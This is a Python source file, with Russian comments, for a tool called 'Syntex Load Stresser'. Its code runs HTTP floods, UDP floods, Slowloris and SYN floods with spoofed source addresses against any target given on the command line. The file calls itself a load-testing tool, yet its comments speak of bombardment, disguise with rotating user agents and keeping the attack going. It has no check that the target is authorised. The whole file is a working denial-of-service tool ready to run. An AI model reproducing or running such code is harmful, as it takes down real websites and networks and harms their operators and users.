# -*- coding: utf-8 -*-
# Syntex Load Stresser
# Импорт необходимых библиотек
import socket
import threading
import requests
import random
import time
import sys
import argparse
import struct
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# Глобальные переменные
attack_running = True
packets_sent = 0
requests_sent = 0

# Список пользовательских агентов для маскировки
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Android 13; Pixel 7) AppleWebKit/537.36 Chrome/116.0.0.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/114.0.0.0",
]

# ===== HTTP ФЛУД =====
# Бомбардировка HTTP-запросами
def http_flood(target_url, thread_id):
    global requests_sent
    session = requests.Session()

    # Обход ограничения по количеству соединений
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=100,
        pool_maxsize=100
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }

    while attack_running:
        try:
            # Рандомный путь для обхода кэширования
            random_path = f"?{random.randint(1, 999999999)}={random.randint(1, 999999999)}"
            url = target_url + random_path

            # Случайный выбор метода
            method = random.choice(["GET", "GET", "GET", "POST"])

            if method == "POST":
                # Мусорные данные для POST-запроса
                payload = {
                    f"field_{random.randint(1, 100)}": "A" * random.randint(10, 200)
                }
                response = session.post(url, data=payload, headers=headers, timeout=5)
            else:
                response = session.get(url, headers=headers, timeout=5)

            requests_sent += 1

        except requests.exceptions.RequestException:
            # Игнорируем ошибки соединения — продолжаем атаку
            pass
        except Exception:
            pass

# ===== UDP ФЛУД =====
# Бомбардировка UDP-пакетами
def udp_flood(target_ip, target_port, thread_id):
    global packets_sent

    # Создаём UDP сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    # Мусорные данные для отправки
    payload = random._urandom(1024)  # 1KB пакет

    while attack_running:
        try:
            # Отправка пакета
            sock.sendto(payload, (target_ip, target_port))
            packets_sent += 1

            # Периодически меняем размер пакета
            if random.randint(1, 100) == 1:
                payload = random._urandom(random.choice([512, 1024, 2048, 4096]))

        except socket.error:
            # Пересоздаём сокет при ошибке
            try:
                sock.close()
            except:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
        except Exception:
            pass

# ===== SLOWLORIS =====
# Медленная атака — удержание соединений открытыми
def slowloris(target_url, thread_id):
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or 80

    while attack_running:
        try:
            # Открываем соединение и держим его открытым
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((host, port))

            # Отправляем частичные заголовки
            sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())

            # Отправляем случайные заголовки медленно
            for _ in range(random.randint(5, 20)):
                header = f"X-{random.randint(1, 9999)}: {'A' * random.randint(1, 50)}\r\n"
                try:
                    sock.send(header.encode())
                except:
                    break
                time.sleep(random.uniform(1, 3))

            sock.close()

        except Exception:
            pass

# ===== SYN ФЛУД =====
# SYN-флуд через raw-сокеты (требует root)
def syn_flood(target_ip, target_port, thread_id):
    global packets_sent

    try:
        # Создаём raw-сокет
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print(f"[!] Требуются права root для SYN-флуда")
        return
    except Exception:
        return

    while attack_running:
        try:
            # Поддельный IP-адрес отправителя
            source_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            source_port = random.randint(1024, 65535)

            # Формируем IP-заголовок
            ip_header = struct.pack(
                "!BBHHHBBH4s4s",
                0x45,              # Версия + длина заголовка
                0,                 # Тип обслуживания
                20 + 20,           # Общая длина (IP + TCP)
                random.randint(1, 65535),  # Идентификатор
                16384,             # Флаги и смещение фрагмента
                64,                # Время жизни
                socket.IPPROTO_TCP,# Протокол
                0,                 # Контрольная сумма
                socket.inet_aton(source_ip),   # IP отправителя
                socket.inet_aton(target_ip)    # IP получателя
            )

            # Формируем TCP-заголовок (SYN)
            tcp_header = struct.pack(
                "!HHIIHHHH",
                source_port,                # Порт отправителя
                target_port,                # Порт получателя
                random.randint(1, 999999),  # Порядковый номер
                0,                          # Номер подтверждения
                (5 << 12) | 0x02,           # Смещение данных + флаг SYN
                8192,                       # Размер окна
                0,                          # Контрольная сумма
                0                           # Указатель важности
            )

            # Отправляем полный пакет
            packet = ip_header + tcp_header
            sock.sendto(packet, (target_ip, 0))
            packets_sent += 1

        except Exception:
            pass

# ===== ОТСЧЁТ СТАТИСТИКИ =====
# Вывод статистики атаки в реальном времени
def stats_monitor():
    global packets_sent, requests_sent

    last_packets = 0
    last_requests = 0

    while attack_running:
        time.sleep(1)

        current_packets = packets_sent
        current_requests = requests_sent

        pps = current_packets - last_packets
        rps = current_requests - last_requests

        print(f"\r[+] Пакетов/сек: {pps} | Запросов/сек: {rps} | "
              f"Всего пакетов: {current_packets} | Всего запросов: {current_requests}",
              end="", flush=True)

        last_packets = current_packets
        last_requests = current_requests

# ===== ГЛАВНАЯ ФУНКЦИЯ =====
def main():
    global attack_running

    parser = argparse.ArgumentParser(
        description="Syntex Load Stresser — инструмент для нагрузочного тестирования"
    )
    parser.add_argument("target", help="Цель (URL или IP)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Порт цели")
    parser.add_argument("-t", "--threads", type=int, default=200, help="Количество потоков")
    parser.add_argument("-m", "--method",
                        choices=["http", "udp", "slowloris", "syn", "all"],
                        default="http", help="Метод тестирования")
    parser.add_argument("--duration", type=int, default=0,
                        help="Длительность в секундах (0 = бесконечно)")

    args = parser.parse_args()

    # Определяем цель
    if args.target.startswith("http"):
        parsed = urlparse(args.target)
        target_ip = parsed.hostname
        target_url = args.target.rstrip("/")
    else:
        target_ip = args.target
        target_url = f"http://{args.target}"

    print(f"""
    ╔══════════════════════════════════════════════╗
    ║       Syntex Load Stresser                   ║
    ║       Инструмент нагрузочного тестирования   ║
    ╠══════════════════════════════════════════════╣
    ║  Цель: {args.target:<39} ║
    ║  Порт: {args.port:<40} ║
    ║  Потоки: {args.threads:<39} ║
    ║  Метод: {args.method:<40} ║
    ║  Длительность: {str(args.duration) if args.duration > 0 else "бесконечно":<32} ║
    ╚══════════════════════════════════════════════╝
    """)

    threads = []

    # Запуск статистики
    stats_thread = threading.Thread(target=stats_monitor, daemon=True)
    stats_thread.start()

    # Запуск тестов в зависимости от выбранного метода
    if args.method in ["http", "all"]:
        for i in range(args.threads):
            t = threading.Thread(target=http_flood, args=(target_url, i), daemon=True)
            t.start()
            threads.append(t)
        print(f"[+] HTTP-флуд запущен: {args.threads} потоков")

    if args.method in ["udp", "all"]:
        for i in range(args.threads):
            t = threading.Thread(target=udp_flood, args=(target_ip, args.port, i), daemon=True)
            t.start()
            threads.append(t)
        print(f"[+] UDP-флуд запущен: {args.threads} потоков")

    if args.method in ["slowloris", "all"]:
        slow_threads = min(args.threads, 100)  # Ограничение для slowloris
        for i in range(slow_threads):
            t = threading.Thread(target=slowloris, args=(target_url, i), daemon=True)
            t.start()
            threads.append(t)
        print(f"[+] Slowloris запущен: {slow_threads} потоков")

    if args.method in ["syn", "all"]:
        for i in range(min(args.threads, 50)):
            t = threading.Thread(target=syn_flood, args=(target_ip, args.port, i), daemon=True)
            t.start()
            threads.append(t)
        print(f"[+] SYN-флуд запущен: {min(args.threads, 50)} потоков")

    print(f"\n[+] Всего активных потоков: {threading.active_count()}")
    print(f"[+] Нажмите Ctrl+C для остановки\n")

    # Основной цикл — ждём завершения
    try:
        if args.duration > 0:
            time.sleep(args.duration)
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        attack_running = False
        print("\n\n[+] Остановлено пользователем")
        print(f"[+] Итого пакетов отправлено: {packets_sent}")
        print(f"[+] Итого HTTP-запросов отправлено: {requests_sent}")
        sys.exit(0)

if __name__ == "__main__":
    main()